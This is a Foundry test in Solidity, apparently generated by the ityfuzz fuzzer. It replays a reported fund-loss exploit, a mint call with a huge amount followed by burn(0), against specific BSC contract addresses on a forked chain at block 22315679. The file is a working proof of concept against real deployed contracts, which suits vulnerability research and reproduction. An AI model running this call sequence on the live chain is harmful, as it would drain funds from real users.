// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x68Cc90351a79A4c10078FE021bE430b7a12aaA09,0x88503F48e437a377f1aC2892cBB3a5b09949faDd,0xc342774492b54ce5F8ac662113ED702Fc1b34972 -c bsc --onchain-block-number 22315679 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Description ================
[Fund Loss]: Anyone can earn 12.036 ETH by interacting with the provided contracts

================ Trace ================
[Sender] 0xe1A425f1AC34A8a441566f93c82dD730639c8510
   ├─[1] 0xc342774492b54ce5F8ac662113ED702Fc1b34972.mint(4951767240.7092 ether, 0x060968186804e803ff86, 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024, (), (), ())
   └─[1] 0xc342774492b54ce5F8ac662113ED702Fc1b34972.burn(0)


 */

contract C68Cc is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 22315679);
    }

    function test() public {
        vm.prank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        bytes32[] memory arr0 = new bytes32[](0);
        bytes32[] memory arr1 = new bytes32[](0);
        uint8[] memory arr2 = new uint8[](0);
        I(0xc342774492b54ce5F8ac662113ED702Fc1b34972).mint(4951767240.7092 ether, "	hh���", 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024, arr0, arr1, arr2);
        vm.prank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        I(0xc342774492b54ce5F8ac662113ED702Fc1b34972).burn(0);
    }

}

interface I {
    function burn(uint256) external payable;
    function mint(uint256,string memory,address,bytes32[] memory,bytes32[] memory,uint8[] memory) external payable;
}
